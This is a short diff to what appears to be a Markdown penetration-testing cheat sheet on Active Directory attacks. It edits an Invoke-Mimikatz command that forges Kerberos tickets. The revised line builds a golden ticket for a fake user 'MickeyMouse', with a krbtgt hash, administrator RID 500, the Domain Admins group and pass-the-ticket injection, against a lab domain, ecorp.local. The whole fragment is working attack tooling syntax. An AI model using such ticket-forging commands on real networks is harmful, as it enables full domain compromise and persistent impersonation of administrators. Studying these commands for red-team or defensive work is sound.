@@ -235,9 +235,9 @@ When invoking command make sure to wrap in double AND single quotes -
 
 ``` 
 Invoke-Mimikatz -Command '"kerberos::golden 
-/domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
-538555522 /target:dc01.ecorp.local /service:HOST 
-/rc4:731a061e57100b658bc59d71f5176e93 /user:Administrator /ptt"'
+/User:MickeyMouse /domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
+538555522 /krbtgt:731a061e57100b658bc59d71f5176e93
+id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 
 
